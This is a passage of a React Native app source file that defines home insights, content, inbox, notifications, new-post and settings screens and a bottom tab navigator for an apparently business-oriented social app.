                <Text style={[stylesHomePage.headerText, { marginLeft: 5 }]}>
                  Insights
                </Text>
              </View>
              <View style={{ marginTop: 10 }}>
                <Text style={{ marginTop: 5, fontSize: 16 }}>Lifetime</Text>
              </View>
              <View
                style={{
                  marginTop: 5,
                  flexDirection: "row",
                  alignItems: "center",
                }}
              >
                <Text style={{ fontSize: 16, fontWeight: "600" }}>501</Text>
                <Text style={{ fontSize: 13, marginLeft: 10 }}>Followers</Text>
              </View>
              <TouchableOpacity
                style={{
                  width: "100%",
                  height: 44,
                  borderRadius: 6,
                  backgroundColor: Colors.bgPrimary,
                  justifyContent: "center",
                  alignItems: "center",
                  paddingHorizontal: 10,
                  paddingVertical: 6,
                  flexDirection: "row",
                  marginTop: 10,
                }}
                onPress={handleCreatePost}
              >
                <ArrowLongIcon />
                <Text
                  style={{
                    fontWeight: "700",
                    marginLeft: 10,
                  }}
                >
                  Your Audience
                </Text>
              </TouchableOpacity>
            </View>
          </View>

          <View style={{ padding: 10, marginTop: 20 }}>
            <View>
              <View style={{ flexDirection: "row", alignItems: "center" }}>
                <InformationCircleIcon />
                <Text style={[stylesHomePage.headerText, { marginLeft: 5 }]}>
                  Trends
                </Text>
              </View>
              <View style={{ flexDirection: "row", marginTop: 10 }}>
                <Text>Sep 15</Text>
                <Text> - Nov 9, 2023</Text>
              </View>
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  marginTop: 10,
                }}
              >
                <Text style={{ fontSize: 17, fontWeight: "bold" }}>99</Text>
                <View
                  style={{
                    flexDirection: "row",
                    alignItems: "center",
                    marginHorizontal: 10,
                  }}
                >
                  <ArrowUpIcon
                    color={Colors.successColor}
                    width={15}
                    height={15}
                  />
                  <Text style={{ color: Colors.successColor, fontSize: 12 }}>
                    100%
                  </Text>
                </View>
                <Text style={{ fontSize: 13 }}>Followers</Text>
              </View>
              <TouchableOpacity
                style={{
                  width: "100%",
                  height: 44,
                  borderRadius: 6,
                  backgroundColor: Colors.bgPrimary,
                  justifyContent: "center",
                  alignItems: "center",
                  paddingHorizontal: 10,
                  paddingVertical: 6,
                  flexDirection: "row",
                  marginTop: 10,
                }}
                onPress={handleCreatePost}
              >
                <Text
                  style={{
                    fontWeight: "700",
                  }}
                >
                  Overview
                </Text>
              </TouchableOpacity>
            </View>
          </View>
        </View>
        <View style={{ height: 50 }}></View>
      </ScrollView>
    </SafeAreaView>
  );
}

const style = StyleSheet.create({});

const stylesHomePage = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#fff",
    overflow: "scroll",
  },
  header: {
    flexDirection: "row",
    backgroundColor: "#fff",
    alignItems: "center",
    justifyContent: "space-between",
    padding: 20,
    paddingTop: 0,
  },
  icon: {
    padding: 10,
    alignItems: "center",
    flexDirection: "row",
    gap: 10,
  },
  headerText: {
    color: "#000",
    fontSize: 20,
    fontWeight: "bold",
  },
  imageContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
  },
  image: {
    width: 200,
    height: 200,
    borderRadius: 100,
  },
  profile: {
    backgroundColor: "#fff",
    padding: 20,
  },
  profileText: {
    color: "#000",
    fontSize: 18,
    textAlign: "center",
  },
});

function ContentScreen({ navigation }) {
  const [active, setActive] = React.useState(1);

  const onActive = function (state) {
    setActive(state);
  };

  const CreateContent = () => {
    navigation.navigate("CreatePost");
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View>
        <View
          style={{
            flexDirection: "row",
            justifyContent: "space-between",
            alignItems: "center",
            paddingHorizontal: 20,
          }}
        >
          <Text style={{ fontWeight: 600, fontSize: 17, fontWeight: "bold" }}>
            Content
          </Text>
          <TouchableOpacity
            style={{
              height: 35,
              borderRadius: 24,
              backgroundColor: Colors.primaryColor,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
            }}
            onPress={CreateContent}
          >
            <Text
              style={{
                fontWeight: "700",
                color: Colors.textWhite,
              }}
            >
              Create
            </Text>
          </TouchableOpacity>
        </View>
        <View
          style={{
            flexDirection: "row",
            justifyContent: "space-between",
            padding: 20,
          }}
        >
          <TouchableOpacity
            style={{
              width: "46%",
              height: 44,
              borderRadius: 6,
              backgroundColor: Colors.bgSecondary,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
            }}
            onPress={() => onActive(1)}
          >
            <Text
              style={{
                fontWeight: "700",
                color: Colors.textWhite,
              }}
            >
              Mentions & Tags
            </Text>
          </TouchableOpacity>
          <View style={{ width: "8%" }} />
          <TouchableOpacity
            style={{
              width: "46%",
              height: 44,
              borderRadius: 6,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
            }}
            onPress={() => onActive(2)}
          >
            <Text
              style={{
                fontWeight: "500",
                color: Colors.textColor,
              }}
            >
              Planners
            </Text>
          </TouchableOpacity>
        </View>
        <View
          style={{
            justifyContent: "center",
            alignItems: "center",
            padding: 50,
          }}
        >
          <Image
            source={require("./assets/images/empty.png")}
            style={{ width: 260, height: 200, objectFit: "cover" }}
          />
          <Text style={{ fontWeight: "bold", marginTop: 10, fontSize: 17 }}>
            No post to show
          </Text>
          <Text
            style={{
              marginTop: 10,
              fontSize: 14,
              textAlign: "center",
            }}
          >
            Posts mentioning or tagging your company will appear here.
          </Text>
        </View>
      </View>
      <View height={100}></View>
    </SafeAreaView>
  );
}

function InboxScreen() {
  const [active, setActive] = React.useState(1);

  const onActive = function (state) {
    setActive(state);
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View style={{ padding: 20 }}>
        <View>
          <Text style={{ fontWeight: 600, fontSize: 17, fontWeight: "bold" }}>
            Home
          </Text>
        </View>
        <View style={{ flexDirection: "row", marginTop: 10 }}>
          <TouchableOpacity
            style={{
              height: 30,
              borderRadius: 24,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
            }}
            onPress={() => onActive(1)}
          >
            <Text
              style={{
                fontWeight: "700",
                color: Colors.textColor,
              }}
            >
              Message
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              height: 30,
              borderRadius: 24,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
              borderWidth: 1,
              borderColor: Colors.primaryColor,
              marginLeft: 10,
            }}
            onPress={() => onActive(2)}
          >
            <Text
              style={{
                fontWeight: "500",
                color: Colors.primaryColor,
              }}
            >
              Comments
            </Text>
          </TouchableOpacity>
        </View>
        <View style={{ marginTop: 10 }}>
          <Text style={{ fontWeight: 600, fontSize: 16, fontWeight: "600" }}>
            All messages
          </Text>
        </View>
        <View
          style={{
            justifyContent: "center",
            alignItems: "center",
            padding: 50,
          }}
        >
          <Image
            source={require("./assets/images/empty.png")}
            style={{ width: 260, height: 200, objectFit: "cover" }}
          />
          <Text style={{ fontWeight: "bold", marginTop: 10, fontSize: 17 }}>
            There no comments
          </Text>
          <Text
            style={{
              marginTop: 10,
              fontSize: 14,
              textAlign: "center",
            }}
          >
            Comments on your posts will displayed here
          </Text>
        </View>
      </View>
      <View height={100}></View>
    </SafeAreaView>
  );
}

export const CustomHeader = ({
  title,
  showBack,
  right,
  info,
  disabled,
  onPress,
  styleHeader,
  titleLeft,
  titleRight,
  navigation,
}) => {
  const b = { disabled, onPress };
  const iconSize = 22;

  const handleBack = (e) => {
    navigation.goBack();
  };

  return (
    <View
      style={{
        flexDirection: "row",
        alignItems: "center",
        height: 60,
        paddingHorizontal: 20,
        justifyContent: "space-between",
        ...styleHeader,
      }}
    >
      <View style={{ flexDirection: "row", alignItems: "center" }}>
        {showBack ? (
          <View
            style={{ flexDirection: "row", alignItems: "center", margin: 5 }}
          >
            <TouchableOpacity onPress={handleBack} style={{ marginRight: 10 }}>
              <ChevronLeftIcon color="black" />
            </TouchableOpacity>
            {titleLeft ? (
              <Text style={{ fontSize: 17, fontWeight: "600" }}>
                {titleLeft}
              </Text>
            ) : null}
          </View>
        ) : null}
      </View>

      <View style={{ flexDirection: "row", alignItems: "center" }}>
        {info ? (
          <Text style={{ fontSize: 17, fontWeight: 600 }}>{info}</Text>
        ) : null}

        {right ? (
          <View style={{ flexDirection: "row", alignItems: "center" }}>
            <TouchableOpacity onPress={handleBack}>{right}</TouchableOpacity>
            {titleRight ? (
              <Text style={{ fontSize: 17, fontWeight: 600 }}>
                {titleRight}
              </Text>
            ) : null}
          </View>
        ) : null}
      </View>
    </View>
  );
};

function NotificationsScreen({ navigation }) {
  const ref = React.useRef(null);
  const [notifications, setNotifications] = React.useState([]);

  React.useEffect(() => {
    const initData = async () => {
      const q = query(collection(db, "notifications"));

      const querySnapshot = await getDocs(q);
      querySnapshot.forEach((doc) => {
        const data = [];
        querySnapshot.forEach((doc) => {
          data.push(doc.data());
        });
        setNotifications(data);
      });
    };

    // initData();
  }, []);
  const openRightDrawer = () => {
    if (this.ref) {
      // @ts-expect-error
      this.ref.openRight();
    }
  };
  return (
    <SafeAreaView style={stylesHomePage.container}>
      <CustomHeader
        showBack
        titleLeft="Notifications"
        navigation={navigation}
      />
      <View flex>
        <View marginT-20 style={{ gap: 20 }}>
          {notifications.map((data) => (
            <View
              key={data.name}
              bg-grey80
              paddingH-20
              paddingV-10
              row
              centerV
              style={{ borderBottomWidth: 1, borderColor: Colors.grey60 }}
              testID="drawer_item"
            >
              {/* <Badge
                testID="drawer_item_badge"
                size={6}
                backgroundColor={
                  data.readed ? Colors.red30 : Colors.transparent
                }
                containerStyle={{ marginRight: 8 }}
              /> */}
              <View marginL-10>
                <Text text70R={!data.readed} text70BO={data.readed}>
                  {data.name}
                </Text>
                <Text text80 marginT-2>
                  {data.text}
                </Text>
              </View>
            </View>
          ))}
        </View>
      </View>
      <View height={100}></View>
    </SafeAreaView>
  );
}

const CreatePost = ({ navigation }) => {
  return (
    <SafeAreaView style={stylesHomePage.container}>
      <CustomHeader
        showBack
        titleLeft="New Post"
        navigation={navigation}
        right={<PaperAirplaneIcon color={Colors.primaryColor} />}
      />
      <View
        style={{
          marginTop: 20,
          alignItems: "center",
          flexDirection: "row",
          backgroundColor: "#e6e6e6",
          borderRadius: 12,
          padding: 15,
        }}
      >
        <Image
          source={require("./assets/images/image-1.jpg")}
          full
          style={{
            width: 60,
            height: 60,
            borderRadius: 100,
            borderColor: "#fff",
            borderWidth: 2,
          }}
        />
        <View style={{ marginLeft: 15 }}>
          <Text style={{ fontSize: 17, fontWeight: "bold" }}>John Done</Text>
          <Text style={{ marginTop: 5, fontSize: 12 }}>Software Engineer</Text>
        </View>
      </View>
      <View style={{ marginTop: 10 }}>
        <TouchableWithoutFeedback onPress={Keyboard.dismiss} accessible={false}>
          <TextInput
            returnKeyType="done"
            rows={4}
            multiline={true}
            placeholder="Share your content"
            style={{
              padding: 20,
              fontSize: 17,
              height: 150,
            }}
          />
        </TouchableWithoutFeedback>
      </View>
      <View style={{ justifyContent: "space-evenly", flexDirection: "row" }}>
        <View style={stylesNewPost}>
          <PhotoIcon color={Colors.successColor} />
          <View style={{ height: 5 }} />
          <Text style={{ marginTop: 10 }}>Photo/Video</Text>
        </View>
        <View style={stylesNewPost}>
          <MapPinIcon color={Colors.dangerColor} />
          <Text style={{ marginTop: 10 }}>Location</Text>
        </View>
        <View style={stylesNewPost}>
          <VideoCameraIcon color={Colors.dangerColor} />
          <Text style={{ marginTop: 10 }}>Live video</Text>
        </View>
      </View>
      <View
        style={{
          marginTop: 10,
          justifyContent: "space-evenly",
          flexDirection: "row",
        }}
      >
        <View center style={stylesNewPost}>
          <FaceSmileIcon color={Colors.warnColor} />
          <Text style={{ marginTop: 10 }}>Photo/Video</Text>
        </View>
        <View center style={stylesNewPost}>
          <CameraIcon color="#6600cc" />
          <Text style={{ marginTop: 10 }}>Location</Text>
        </View>
        <View center style={stylesNewPost}>
          <ChatBubbleLeftEllipsisIcon color={Colors.primaryColor} />
          <Text style={{ marginTop: 10 }}>Live video</Text>
        </View>
      </View>
    </SafeAreaView>
  );
};

const stylesNewPost = StyleSheet.create({
  borderRadius: 10,
  backgroundColor: "#f2f2f2",
  padding: 15,
  width: "30%",
  justifyContent: "ceneter",
  alignItems: "center",
});

function SettingsScreen({ navigation }) {
  const [avatar, setAvatar] = React.useState("");
  const [name, setName] = React.useState("");
  const [planner, setPlanner] = React.useState("");
  const [darkMode, setDarkMode] = React.useState(false);
  const [showAds, setShowAds] = React.useState(true);
  const [enableNotifications, setEnableNotifications] = React.useState(true);

  const handleSaveChanges = () => {
    // Handle saving changes to the server or local storage
    console.log("Changes saved:", {
      avatar,
      name,
      planner,
      darkMode,
      showAds,
      enableNotifications,
    });
  };

  const handleAvatarChange = (image) => {
    setAvatar(image.uri);
  };

  function handleGoNotifications() {
    navigation.navigate("Notifications");
  }

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View style={{ padding: 20 }}>
        <View
          style={{
            flexDirection: "row",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <Text style={{ fontWeight: 600, fontSize: 17, fontWeight: "bold" }}>
            Menu
          </Text>
          <TouchableOpacity
            style={{
              width: 40,
              height: 40,
              borderRadius: 999,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f2f2f2",
            }}
            onPress={() => onActive(2)}
          >
            <MagnifyingGlassIcon color={Colors.textColor} />
          </TouchableOpacity>
        </View>
        <View
          style={{
            marginTop: 20,
            alignItems: "center",
            flexDirection: "row",
            backgroundColor: "#e6e6e6",
            borderRadius: 12,
            padding: 15,
          }}
        >
          <Image
            source={require("./assets/images/image-1.jpg")}
            full
            style={{
              width: 50,
              height: 50,
              borderRadius: 100,
              borderColor: "#fff",
              borderWidth: 2,
            }}
          />
          <View
            style={{
              flexDirection: "row",
              justifyContent: "space-between",
              alignItems: "center",
              flex: 1,
            }}
          >
            <View style={{ marginLeft: 10 }}>
              <Text style={{ fontSize: 17, fontWeight: "bold" }}>
                John Done
              </Text>
              <Text style={{ marginTop: 5, fontSize: 12 }}>
                Software Engineer
              </Text>
            </View>
            <View>
              <TouchableOpacity>
                <ArrowPathIcon color={Colors.primaryColor} />
              </TouchableOpacity>
            </View>
          </View>
        </View>
        <View style={{ marginTop: 20 }}>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={handleGoNotifications}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Notifications</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={handleGoNotifications}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Supports</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={handleGoNotifications}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Settings</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
          <TouchableOpacity
            style={{
              width: "100%",
              borderRadius: 12,
              height: 50,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              backgroundColor: "#f6f7f8",
              marginTop: 10,
            }}
            onPress={handleGoNotifications}
          >
            <View
              style={{
                width: "100%",
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 10,
                alignItems: "center",
              }}
            >
              <Text color={Colors.textColor}>Contacts</Text>
              <ChevronRightIcon color="#cccccc" />
            </View>
          </TouchableOpacity>
        </View>
        <View style={{ marginTop: 20 }}>
          <View style={stylesProfile.switchContainer}>
            <Text style={{ fontWeight: "600" }}>Dark Mode</Text>
            <Switch
              onColor={Colors.$textGeneral}
              value={darkMode}
              onValueChange={() => setDarkMode(!darkMode)}
            />
          </View>

          <View style={stylesProfile.switchContainer}>
            <Text style={{ fontWeight: "600" }}>Show Ads</Text>
            <Switch
              onColor={Colors.$textGeneral}
              value={showAds}
              onValueChange={() => setShowAds(!showAds)}
            />
          </View>

          <View style={stylesProfile.switchContainer}>
            <Text style={{ fontWeight: "600" }}>Enable Notifications</Text>
            <Switch
              onColor={Colors.$textGeneral}
              value={enableNotifications}
              onValueChange={() => setEnableNotifications(!enableNotifications)}
            />
          </View>
        </View>
      </View>
    </SafeAreaView>
  );
}
const stylesProfile = StyleSheet.create({
  switchContainer: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    padding: 10,
  },
});
const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();

function App() {
  return (
    <NavigationContainer>
      <StatusBar barStyle="dark-content" />
      <Tab.Navigator initialRouteName="SnackScreen">
        <Tab.Screen
          options={{
            gestureEnabled: false,
            headerShown: false,
            tabBarShowLabel: false,
            tabBarStyle: {
              position: "absolute",
              shadowColor: "#fff",
              shadowOffset: {
                width: 0,
                height: 10,
              },
              shadowOpacity: 0,
              shadowRadius: 3.5,
              elevation: 0,
              height: 80,
              bottom: 0,
              paddingTop: 10,
            },
            tabBarIcon: ({ focused }) => (
              <View style={{ justifyContent: "center", alignItems: "center" }}>
                <Image
                  source={require("./assets/images/image-1.jpg")}
                  full
                  style={{
                    width: 30,
                    height: 30,
                    borderRadius: 100,
                    borderColor: "#fff",
                    borderWidth: 2,
                  }}
                />
                <Text
                  style={{
                    color: focused ? Colors.primaryColor : Colors.textColor,
                  }}
                >
                  Home
                </Text>
              </View>
            ),
          }}
          name="SnackScreen"
          component={SnackScreen}
        />
        <Tab.Screen
          options={{
            gestureEnabled: false,
            headerShown: false,
            tabBarShowLabel: false,
            tabBarStyle: {
              position: "absolute",
              shadowColor: "#fff",
              shadowOffset: {
                width: 0,
                height: 10,
              },
              shadowOpacity: 0,
              shadowRadius: 3.5,
              elevation: 0,
              height: 80,
              bottom: 0,
              paddingTop: 10,
            },
            tabBarIcon: ({ focused }) => (
              <View style={{ justifyContent: "center", alignItems: "center" }}>
                <NewsIcon
                  size={28}
                  color={focused ? Colors.primaryColor : Colors.textColor}
                />
                <Text
                  style={{
                    color: focused ? Colors.primaryColor : Colors.textColor,
                  }}
                >
                  Content
                </Text>
              </View>
            ),
          }}
          name="Content"
          component={ContentScreen}
        />
        <Tab.Screen
          options={{
            gestureEnabled: false,
            headerShown: false,
            tabBarShowLabel: false,
            tabBarStyle: {
              position: "absolute",
              shadowColor: "#fff",
              shadowOffset: {
                width: 0,
                height: 10,
              },
              shadowOpacity: 0,
              shadowRadius: 3.5,
              elevation: 0,
              height: 80,
              bottom: 0,
              paddingTop: 10,
            },
            tabBarIcon: ({ focused }) => (
              <View style={{ justifyContent: "center", alignItems: "center" }}>
                <ChatBubbleLeftEllipsisIcon
                  size={28}
                  color={focused ? Colors.primaryColor : Colors.textColor}
                />
                <Text
                  style={{
                    color: focused ? Colors.primaryColor : Colors.textColor,
                  }}
                >
                  Inbox
                </Text>
              </View>
            ),
          }}
          name="Inbox"
          component={InboxScreen}
        />
        <Tab.Screen
          options={{
            gestureEnabled: false,
            headerShown: false,
            tabBarShowLabel: false,
            tabBarStyle: {
              position: "absolute",
              shadowColor: "#fff",
              shadowOffset: {
                width: 0,
                height: 10,
              },
              shadowOpacity: 0,
              shadowRadius: 3.5,
              elevation: 0,
              height: 80,
              bottom: 0,
              paddingTop: 10,
            },
            tabBarIcon: ({ focused }) => (
              <View style={{ justifyContent: "center", alignItems: "center" }}>
                <Bars3Icon
                  size={28}
                  color={focused ? Colors.primaryColor : Colors.textColor}
                />
                <Text
                  style={{
                    color: focused ? Colors.primaryColor : Colors.textColor,
                  }}
                >
                  More
                </Text>
              </View>
            ),
          }}
          name="More"
          component={SettingsScreen}
        />
      </Tab.Navigator>
    </NavigationContainer>
  );
}
export default App;
